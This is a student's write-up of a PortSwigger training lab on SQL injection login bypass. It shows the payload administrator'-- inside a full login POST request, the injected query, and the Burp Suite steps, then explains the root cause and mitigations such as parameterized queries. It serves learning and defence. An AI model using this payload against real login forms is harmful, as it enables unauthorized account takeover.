# 🔓 Lab 02: SQL Injection — Login Bypass

> **Lab URL:** [PortSwigger Web Security Academy](https://portswigger.net/web-security/sql-injection/lab-login-bypass)  
> **Difficulty:** 🟢 Apprentice  
> **Status:** ✅ Solved

---

## 📋 Lab Description

> *"This lab contains a SQL injection vulnerability in the login function. To solve the lab, perform a SQL injection attack that logs in to the application as the administrator user."*

---

## 🔍 Reconnaissance

### Step 1: Identify the Login Endpoint
The application has a login page accessible via the **"My account"** link in the navigation bar.

```
https://<lab-id>.web-security-academy.net/login
```

The login form contains two input fields:
- `username`
- `password`

### Step 2: Test for SQL Injection
I intercepted the login request using Burp Suite and tested the `username` field with a single quote to see if the query breaks:

```
username=admin&password=admin123
```

**Result:** The application returned a generic error message — indicating the input is directly concatenated into the SQL query.

---

## 🚀 Exploitation

### Payload Used
```
administrator'--
```

### Full Request (POST)
```http
POST /login HTTP/1.1
Host: <lab-id>.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 70

username=administrator'--&password=anything
```

### What Happens?

**Original Query:**
```sql
SELECT * FROM users 
WHERE username = 'administrator' AND password = '...'
```

**Injected Query:**
```sql
SELECT * FROM users 
WHERE username = 'administrator'--' AND password = 'anything'
```

**Breakdown:**
- `administrator` — the target username we want to authenticate as
- `'` — closes the original string literal in the SQL query
- `--` — SQL comment operator that comments out the rest of the query (including the `AND password` check)

**Result:** The query only checks if the username exists. The password verification is completely bypassed, allowing login as the `administrator` user without knowing the password.

---

## 🛠️ Burp Suite Intercept

I used **Burp Suite** to intercept and modify the login request before sending it to the server.

### Steps:
1. Configured Firefox proxy to route through Burp Suite (127.0.0.1:8080)
2. Turned on **Intercept** in Burp Suite Proxy tab
3. Entered random credentials in the login form and clicked **"Log in"**
4. Modified the intercepted `username` parameter to inject the payload `administrator'--`
5. Forwarded the modified request

### Screenshot

<img width="2560" height="1368" alt="Screenshot 2026-08-14 013223" src="https://github.com/user-attachments/assets/9daab728-0d5e-4ab2-9a1e-9fb52b07a831" />


> **Note:** The intercepted request shows the raw HTTP POST request with the injected payload in the `username` parameter.

---

## 📸 Proof of Concept

### After Injection

<img width="2560" height="1368" alt="Screenshot 2026-08-14 013420" src="https://github.com/user-attachments/assets/0182f86d-a8c4-4e1a-b3cb-47032a621a45" />

<img width="2560" height="1368" alt="Screenshot 2026-08-14 013605" src="https://github.com/user-attachments/assets/704da694-0b6c-4d20-beae-1d0cbdf583c8" />


As seen in the screenshot:
- The payload `administrator'--` was injected into the `username` field
- The server responded with a **302 Redirect** to `/my-account?id=administrator`
- Successfully logged in as the **administrator** user
- The account page displays: *"Your username is: administrator"*
- Lab shows **"Congratulations, you solved the lab!"**

---

## 🧠 Key Takeaways

### 1. Vulnerability Root Cause
The application constructs SQL queries using **string concatenation** for authentication checks instead of **parameterized queries** or **prepared statements**.

### 2. Impact
- **Authentication Bypass:** Complete bypass of password verification
- **Privilege Escalation:** Gain unauthorized access to admin accounts
- **Account Takeover:** Potential to access any user account by changing the username in the payload
- **Data Breach:** Access to sensitive admin-only data and functionality

### 3. Mitigation Strategies
| Defense | Implementation |
|---------|---------------|
| **Parameterized Queries** | Use prepared statements (`?` placeholders) for all database queries |
| **Input Validation** | Reject or sanitize special characters (`'`, `"`, `--`, `;`) |
| **ORM Frameworks** | Use ORMs that automatically handle query construction securely |
| **Password Hashing** | Never compare plaintext passwords; use bcrypt/Argon2 |
| **Multi-Factor Authentication** | Add MFA to prevent single-factor bypass attacks |

### 4. Why This Matters for AppSec
Understanding SQL Injection in authentication is critical because:
- It's the #1 entry point for **account takeover** attacks
- It allows attackers to bypass the entire authentication mechanism
- It often leads to **full application compromise** when admin accounts are targeted
- It remains in the [OWASP Top 10](https://owasp.org/www-project-top-ten/) year after year

---

## 📚 References

- [PortSwigger SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [OWASP SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [PayloadsAllTheThings - SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

---

## 🔗 Related Labs

| Lab | Topic | Status |
|-----|-------|--------|
| [Lab 01](../01-hidden-data) | SQL Injection — Hidden Data Retrieval | ✅ Solved |
| [Lab 03](../03-union-attack) | SQL Injection — UNION Attack | ⏳ Pending |

---

> 📝 **Author:** Saber Hasan Swoyon  
> 🎓 **Status:** Student | Aspiring AppSec Engineer  
> 📅 **Date Solved:** 2026-08-15
